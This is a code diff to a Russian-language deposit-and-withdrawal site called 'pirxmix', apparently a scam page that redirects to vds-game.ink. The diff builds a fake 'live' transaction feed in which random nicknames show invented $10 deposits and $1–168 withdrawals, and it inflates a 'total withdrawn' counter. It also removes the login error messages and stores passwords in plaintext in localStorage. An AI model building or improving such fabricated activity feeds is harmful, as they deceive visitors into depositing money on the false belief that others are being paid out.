@@ -473,7 +473,7 @@
             <div class="stat-value" id="todayUsers">127</div>
         </div>
         <div class="stat-item">
-            <div class="stat-label">💰 Всего вывели денег</div>
+            <div class="stat-label">💰 Всего выведено</div>
             <div class="stat-value" id="totalWithdrawn">18500 $</div>
         </div>
     </div>
@@ -500,11 +500,11 @@
 <!-- Нижняя лента транзакций -->
 <div class="live-feed">
     <div class="feed-half deposit-feed">
-        <div class="feed-title">🟢 Пополнения</div>
+        <div class="feed-title">🟢 Последние пополнения</div>
         <div class="feed-list" id="depositList"></div>
     </div>
     <div class="feed-half withdraw-feed">
-        <div class="feed-title">🔴 Выводы</div>
+        <div class="feed-title">🔴 Последние выводы</div>
         <div class="feed-list" id="withdrawList"></div>
     </div>
 </div>
@@ -542,23 +542,18 @@
             e.preventDefault();
             const nickname = document.getElementById('nickname').value.trim();
             const password1 = document.getElementById('password1').value;
-            if (!nickname) { alert('Пожалуйста, введите никнейм.'); return; }
-            if (!password1) { alert('Введите пароль.'); return; }
+            if (!nickname || !password1) return;
 
             if (isLoginMode) {
                 const savedUser = JSON.parse(localStorage.getItem('pirxmix_user'));
-                if (!savedUser || savedUser.nickname !== nickname) {
-                    alert('❌ Пользователь не найден. Зарегистрируйтесь.');
-                    return;
-                }
+                if (!savedUser || savedUser.nickname !== nickname) return;
                 localStorage.setItem('pirxmix_user', JSON.stringify({ nickname, password: password1 }));
                 window.location.href = 'https://vds-game.ink/home';
             } else {
                 const password2 = document.getElementById('password2').value;
-                if (password1 !== password2) { alert('❌ Пароли не совпадают.'); return; }
+                if (password1 !== password2) return;
                 localStorage.setItem('pirxmix_user', JSON.stringify({ nickname, password: password1 }));
                 localStorage.setItem('pirxmix_balance', '0');
-                alert('✅ Регистрация успешна! Сейчас вы будете перенаправлены в личный кабинет.');
                 window.location.href = 'https://vds-game.ink/home';
             }
         });
@@ -622,47 +617,57 @@
         const withdrawList = document.getElementById('withdrawList');
         const MAX_ITEMS = 10;
 
-        // Русские ники в разных форматах (без цифр)
-        const russianNicks = [
-            // Одно слово с большой буквы
+        // Никнеймы на русском и английском в разных форматах
+        const allNicks = [
+            // Русские одно слово с большой
             'Алексей', 'Мария', 'Дмитрий', 'Елена', 'Сергей', 'Ольга', 'Андрей', 'Татьяна', 'Николай', 'Анна',
             'Владимир', 'Ирина', 'Павел', 'Наталья', 'Максим', 'Светлана', 'Роман', 'Юлия', 'Артём', 'Виктория',
-            // Два слова с большой и с маленькой
+            // Русские два слова (разный регистр)
             'Иван петров', 'Мария сидорова', 'Пётр кузнецов', 'Екатерина смирнова', 'Александр попов',
             'дарья Васильева', 'ольга Зайцева', 'никита Морозов', 'арина Соколова', 'тимофей Лебедев',
             'Кристина волкова', 'Артур козлов', 'Диана новикова', 'Глеб егоров', 'Алиса фёдорова',
-            // Одно слово с маленькой буквы
+            // Русские одно слово с маленькой
             'сокол', 'волк', 'медведь', 'лиса', 'орёл', 'ястреб', 'барс', 'тигр', 'филин', 'ворон',
-            // Два слова с большой буквы каждое
+            // Русские два слова с большой
             'Лунный Свет', 'Белый Клык', 'Чёрный Ворон', 'Золотой Орёл', 'Серебряный Лис',
             'Красный Дракон', 'Синий Кит', 'Быстрый Ветер', 'Тихий Шёпот', 'Громкий Зов',
-            'Тёмный Рыцарь', 'Снежный Барс', 'Огненный Феникс', 'Морской Волк', 'Лесной Дух'
+            // Английские одно слово
+            'Alexander', 'Victoria', 'Maxim', 'Svetlana', 'Dmitry', 'Natalie', 'Sergey', 'Ekaterina', 'Roman', 'Yulia',
+            'shadow', 'phoenix', 'dragon', 'wolf', 'eagle', 'hawk', 'tiger', 'raven', 'fox', 'bear',
+            // Английские два слова
+            'Dark Knight', 'Silver Fox', 'Golden Eagle', 'White Wolf', 'Black Raven',
+            'Red Phoenix', 'Blue Dragon', 'Swift Wind', 'Silent Shadow', 'Lucky Star',
+            'john smith', 'mary jones', 'peter brown', 'anna white', 'tom black',
+            'alice Green', 'bob Taylor', 'kate Wilson', 'mike Davis', 'lisa Moore'
         ];
 
         function randomNick() {
-            return russianNicks[Math.floor(Math.random() * russianNicks.length)];
+            return allNicks[Math.floor(Math.random() * allNicks.length)];
         }
 
         function getCurrentTime() {
             return new Date().toLocaleTimeString('ru-RU', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
         }
 
-        function getRandomAmount() {
-            // Случайная сумма от 1 до 168 $
+        function getRandomWithdrawAmount() {
+            // Случайная сумма вывода от 1 до 168 $
             return Math.floor(Math.random() * 168) + 1;
         }
 
         function addTransaction(container, type) {
             const item = document.createElement('div');
             item.className = `feed-item ${type}`;
-            const amount = getRandomAmount();
+            
+            // Пополнение всегда 10$, вывод — случайная сумма от 1 до 168$
+            const amount = type === 'deposit' ? 10 : getRandomWithdrawAmount();
+            
             item.innerHTML = `<span><span class="feed-user">${randomNick()}</span><span class="feed-time">${getCurrentTime()}</span></span><span class="feed-amount">${amount}$</span>`;
             container.prepend(item);
             while (container.children.length > MAX_ITEMS) {
                 container.removeChild(container.lastChild);
             }
 
-            // Если это вывод, увеличиваем счётчик "Всего вывели денег" на сумму вывода
+            // Если это вывод, увеличиваем счётчик "Всего выведено" на сумму вывода
             if (type === 'withdraw') {
                 const oldWithdrawn = totalWithdrawn;
                 totalWithdrawn += amount;
